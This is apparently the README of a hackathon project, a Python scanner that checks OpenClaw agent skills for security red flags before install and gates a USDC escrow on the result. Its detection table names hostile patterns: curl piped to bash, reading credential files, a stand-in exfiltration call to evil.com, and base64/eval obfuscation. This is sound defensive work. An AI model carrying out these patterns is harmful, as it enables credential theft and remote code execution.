# SafeGuard — Skill Supply-Chain Security for OpenClaw

> **#USDCHackathon Submission — Best OpenClaw Skill Track**
>
> [Moltbook Post](https://www.moltbook.com/post/6095653c-009f-4ca3-8fbe-2f21da3bee4f) · [InstallToPay Demo](https://usdc-hackathon-agentic-commerce.vercel.app)

**Pay only after safe install.** SafeGuard scans OpenClaw skills for security red flags *before* your agent installs them.

## 30-Second Demo

```bash
git clone https://github.com/afafw/usdc-hackathon-openclaw-skill
cd usdc-hackathon-openclaw-skill

# Scan a safe skill → ✅ ALLOW
python3 scan.py demo-skills/safe-weather/

# Scan a tampered skill → 🚨 BLOCK
python3 scan.py demo-skills/tampered-weather/
```

## What it catches

| Flag | Example |
|------|---------|
| 🚩 Pipe-to-shell | `curl ... \| bash` |
| 🚩 Credential access | reads `~/.config/*/credentials.json` |
| 🚩 Data exfiltration | `fetch('https://evil.com/collect')` |
| 🚩 Privilege escalation | `sudo`, `chmod 777` |
| 🚩 Code obfuscation | `base64 -d`, `eval()` |
| 🚩 Version drift | hash changed between versions |

## How InstallToPay Uses SafeGuard

SafeGuard is the verification layer in the [InstallToPay](https://usdc-hackathon-agentic-commerce.vercel.app) escrow flow:

```
Buyer locks USDC → Seller delivers skill → SafeGuard scans → ALLOW? Release : Dispute
```

1. Buyer creates USDC escrow
2. Seller delivers skill package
3. **SafeGuard scans** → `ALLOW` or `BLOCK`
4. If ALLOW → USDC auto-releases
5. If BLOCK → dispute triggers on-chain arbitration

## Install as OpenClaw Skill

```bash
# Copy to skills directory
cp -r . ~/.openclaw/skills/safeguard/

# Or just reference in your AGENTS.md:
# "Before installing any skill, run: python3 ~/.openclaw/skills/safeguard/scan.py <skill_dir>"
```

## On-Chain Attestation (Base Sepolia)

Scan results are attested via [ReputationPassport](https://sepolia.basescan.org/address/0x8cF1FAE51Fffae83aB63f354a152256B62828E1E):

```bash
python3 scan.py demo-skills/tampered-weather/ --json
# → produces attestable report hash
```

## Files

```
├── SKILL.md                        # OpenClaw skill manifest
├── scan.py                         # Scanner (zero dependencies)
├── README.md
└── demo-skills/
    ├── safe-weather/               # Clean skill → ✅ ALLOW
    │   ├── SKILL.md
    │   └── weather.py
    └── tampered-weather/           # Malicious skill → 🚨 BLOCK
        ├── SKILL.md
        └── weather.py              # Contains simulated exfil + RCE
```

## What's Novel

1. **Not just a scanner — a supply-chain gate.** Tracks version hashes, detects drift between releases.
2. **Plugs into escrow.** SafeGuard verdict determines whether USDC releases or disputes.
3. **Zero dependencies.** Pure Python, runs anywhere Python3 exists. No pip install needed.
